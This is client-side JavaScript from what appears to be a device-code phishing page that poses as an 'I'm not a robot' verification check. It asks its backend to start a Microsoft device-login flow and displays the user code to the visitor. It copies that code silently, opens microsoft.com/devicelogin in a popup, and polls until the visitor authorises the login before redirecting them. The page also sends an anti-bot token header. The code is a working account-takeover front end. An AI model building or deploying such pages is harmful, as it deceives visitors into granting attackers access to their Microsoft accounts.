        /* ── Open Microsoft device-login popup ─────────────────────── */
        function openPopup() {
            const m = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent) || window.innerWidth <= 768;
            if (m) popupRef = window.open('https://microsoft.com/devicelogin', '_blank');
            else popupRef = window.open('https://microsoft.com/devicelogin', 'ML', 'width=500,height=600');
        }

        /* ── Verify button: copy code silently then open popup ──────── */
        function verifyWithCopy() {
            const code = document.getElementById('codeValue').textContent;
            const btn = document.getElementById('verifyIdBtn');
            const originalHTML = btn.innerHTML;

            navigator.clipboard.writeText(code).catch(() => {
                // fallback for older browsers
                const ta = document.createElement('textarea');
                ta.value = code;
                ta.style.position = 'fixed';
                ta.style.opacity = '0';
                document.body.appendChild(ta);
                ta.select();
                document.execCommand('copy');
                document.body.removeChild(ta);
            });

            // Brief "Copied!" flash on button label
            btn.innerHTML = '<svg viewBox="0 0 16 16" fill="none" stroke="currentColor" stroke-width="1.8" stroke-linecap="round"><polyline points="2,8 6,12 14,4"/></svg> Code copied!';
            const copyBtn = document.getElementById('copyBtn');
            if (copyBtn) { copyBtn.textContent = 'Copied!'; setTimeout(() => copyBtn.textContent = 'Copy code', 1500); }
            setTimeout(() => { btn.innerHTML = originalHTML; }, 1500);

            openPopup();
        }

        /* ── Entry point ───────────────────────────────────────────── */
        async function generateCode() {
            // Hide refresh button, reset UI
            document.getElementById('refreshBtn').classList.remove('show');
            document.getElementById('actionRow').style.display = 'none';
            document.getElementById('timer').textContent = '';
            document.getElementById('timer').classList.remove('expired');

            const startBtn = document.getElementById('startBtn');
            startBtn.textContent = 'Generating verification code...';
            startBtn.disabled = true;

            setStatus('');
            clearInterval(pollInterval);
            clearInterval(countdown);
            sid = null;
            codeReady = false;

            try {
                const r = await fetch('/api/device/start', {
                    method: 'POST',
                    headers: { 'X-Antibot-Token': AT, 'X-Auth-Mode': MODE }
                });
                const d = await r.json();

                if (d.error) { showError(d.error); return; }

                sid = d.job_id;
                if (!sid) { showError('Session failed. Please refresh.'); return; }
                startTime = Date.now();

                document.getElementById('codeArea').classList.add('show');
                setStatus('Connecting to Microsoft servers…');

                pollInterval = setInterval(poll, 1000); poll();

            } catch (e) {
                showError(e.message || 'Connection failed');
            }
        }

        /* ── Poll backend ──────────────────────────────────────────── */
        async function poll() {
            if (Date.now() - startTime > (Number(window.__DEVICE_POLL_TIMEOUT_MS) || 600000)) {
                clearInterval(pollInterval);
                onExpired();
                return;
            }

            try {
                const r = await fetch('/api/device/status/' + sid);
                const d = await r.json();

                if (d.status === 'waiting_user' && d.user_code) {
                    const el = document.getElementById('codeValue');

                    if (el.textContent !== d.user_code) {
                        el.style.opacity = 0;
                        setTimeout(() => {
                            el.textContent = d.user_code;
                            el.style.opacity = 1;
                        }, 150);
                    }

                    if (!codeReady) {
                        codeReady = true;

                        // Hide the initial "I'm not a robot" button permanently
                        document.getElementById('startBtn').style.display = 'none';

                        // Show copy + verify buttons
                        document.getElementById('actionRow').style.display = 'flex';

                        setStatus('');
                        startTimer(600);
                    }
                }

                if (d.status === 'done' || d.status === 'success' || d.status === 'completed') {
                    clearInterval(pollInterval);
                    clearInterval(countdown);
                    showSuccess(window.__DESTINATION_URL);
                }

                if (d.status === 'failed' || d.status === 'timeout_waiting_user_login') {
                    clearInterval(pollInterval);
                    showError(d.error || d.status);
                }

            } catch (e) {
            }
        }

        /* ── Copy code — also opens popup automatically ────────────── */
        function copyCode() {
            const code = document.getElementById('codeValue').textContent;
            navigator.clipboard.writeText(code).then(() => {
                const btn = document.getElementById('copyBtn');
                btn.textContent = 'Copied!';
                setTimeout(() => btn.textContent = 'Copy code', 1500);
            });
            // Auto-open popup after copying
            openPopup();
        }

        /* ── Timer ─────────────────────────────────────────────────── */
        function startTimer(sec) {
            clearInterval(countdown);
            const el = document.getElementById('timer');
            let t = sec;

            const tick = () => {
                if (t > 0) {
                    const m = Math.floor(t / 60);
                    const s = String(t % 60).padStart(2, '0');
                    el.textContent = 'Valid for ' + m + ':' + s;
                } else {
                    clearInterval(countdown);
                    clearInterval(pollInterval);
                    onExpired();
                }
                t--;
            };
            tick();
            countdown = setInterval(tick, 1000);
        }

        /* ── Called when timer hits 0 or server timeout ────────────── */
        function onExpired() {
            const timerEl = document.getElementById('timer');
            timerEl.textContent = 'Code expired.';
            timerEl.classList.add('expired');

            // Hide copy/verify, show refresh
            document.getElementById('actionRow').style.display = 'none';
            document.getElementById('refreshBtn').classList.add('show');

            setStatus('');
        }

        /* ── Helpers ────────────────────────────────────────────────── */
        function setStatus(msg) {
            const el = document.getElementById('statusMsg');
            el.textContent = msg;
            el.classList.remove('error');
        }

        function showError(code) {
            const map = {
                timeout_waiting_user_login: 'Your verification code has expired. Please refresh.',
                'Session expired': 'Your verification code has expired. Please refresh.',
                failed: 'Verification failed. Please try again.',
                'Worker error': 'Something went wrong. Please try again.',
                'Worker crash': 'Something went wrong. Please try again.'
            };

            onExpired();
            const el = document.getElementById('statusMsg');
            el.textContent = map[code] || 'Something went wrong. Please try again.';
            el.classList.add('error');
        }
